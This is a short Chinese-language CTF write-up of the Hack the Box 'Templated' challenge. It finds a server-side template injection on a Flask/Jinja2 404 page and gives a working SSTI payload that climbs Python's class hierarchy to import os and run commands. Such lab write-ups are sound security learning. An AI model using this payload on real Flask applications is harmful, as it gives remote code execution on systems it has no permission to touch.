---
title: "Hack the Box——Templated"
date: 2020-12-16T11:32:53+08:00
showDate: true
draft: false
tags: ["security","hack the box", "ctf"]
categories: ["security"]
---


## 0x00 前言

好久没有逛htb了，今天上htb，发现出新题了，难度是EASY，那应该挺简单的。马上开做。

## 0x01 访问主站

从界面写的`powered by Flask/Jinja2`和题目叫`Templated`，盲猜这题是ssti了。

![1.png](1.png)

但是首页应该是没有注入点，所以得找找注入点

## 0x02 404注入点

url随便加个path，这个404的界面就很可疑了。

![2.png](2.png)

测试下payload `{{ config }}`，成功找到注入点

![3.png](3.png)

## 0x03 漏洞利用

这里就可以通过python的魔术方法，首先通过`__class__`获取对象的类，然后`__mro__`获取对象继承的类，因为所有的对象都是继承自object，这样就可以拿到object类了，再通过`__subclasses__`获取到object的子类，子类中的`<class 'warnings.catch_warnings'>`的命名空间里有`__builtins__`，最后使用`__import__`方法导入`os`库就可以任意命令执行了。最后的payload如下。

```python
{{ "".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read() }}
```

## 0x04 总结

这个题目确实有点过于简单了，也没有过滤啥的。

## 0x05

[一篇文章带你理解漏洞之SSTI漏洞](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Flask-Jinja2)

